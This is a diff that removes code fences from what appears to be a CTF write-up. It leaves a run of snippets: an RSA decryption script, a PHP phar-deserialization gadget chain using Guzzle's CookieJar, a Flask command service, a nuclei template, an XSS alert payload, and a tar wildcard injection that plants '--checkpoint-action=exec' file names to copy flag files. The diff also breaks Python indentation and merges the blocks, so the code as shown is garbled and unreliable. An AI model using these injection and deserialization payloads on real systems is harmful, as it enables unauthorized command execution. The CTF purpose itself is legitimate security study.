@@ -43,17 +43,7 @@ d = inverse(e, phi)
 print(d)
 print(pow(c,d,n))
 print(long_to_bytes(pow(c, d, n)))
-```
-
-
-
-```
 <?php show_source(__FILE__); file($_POST['a']); ?>
-```
-
-
-
-```
 <?php  
 namespace GuzzleHttpCookie {  
     class CookieJar  
@@ -85,11 +75,6 @@ namespace {  
     //签名⾃动计算  
     $phar->stopBuffering();  
 }
-```
-
-
-
-```
 import flask
 import subprocess
 import re
@@ -116,17 +101,13 @@ def submit():
                 return flag
             else:
                 return "非常安全，没有问题！"
-        except subprocess.CalledProcessError:
+        
+except subprocess.CalledProcessError:
             return "Error occurred while running command"
     return "Invalid request"
 
 if __name__ == '__main__':
     ... ...
-```
-
-
-
-```
 id: custom-templates
 
 info:
@@ -185,46 +166,26 @@ http:
         part: body_1
         regex:
           - ""version":"([0-9.]+)""
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
     <title>First Endpoint</title>
 </head>
-<body>
-    <p>{"NAME":"HACKER","msg":"success","version":"10.0.4"}</p>
-</body>
-```
 
+    {"NAME":"HACKER","msg":"success","version":"10.0.4"}
 
-
-```
 <!DOCTYPE html>
 <html>
 <head>
     <title>Second Endpoint</title>
 </head>
-<body>
-    <p>xxxcom</p>
-    <p>zkaq{a}</p>
+
+    xxxcom
+    zkaq{a}
     <script>alert(1111)</script>
-</body>
+
 </html>
-```
-
-
-
-```
 python3 -m http.server 9999
-```
-
-
-
-```
 # upload file
 @app.route('/api/upload', methods=['POST'])
 def upload():
@@ -256,29 +217,9 @@ def download():
 
     # send tar to user
     return send_file(f"uploads/{g.uuid}/out.tar", as_attachment=True, download_name='download.tar', mimetype='application/octet-stream')
-```
-
-
-
-```
 os.system(f"cd uploads/{g.uuid}/ && tar -cf out.tar *")
-```
-
-
-
-```
 --checkpoint-action=exec=python3 -c "import os;x = chr(47);os.system(f'cp {x}flag* .')"
-```
-
-
-
-```
 --checkpoint=1
-```
-
-
-
-```
 tmp=[
   0x19, 0x37, 0x35, 0x36, 0x08, 0x1B,0x36,0x3E,0xD4,0xE6,
   0x0A,  0x3C,0xE6, 0x5A, 0x29,  
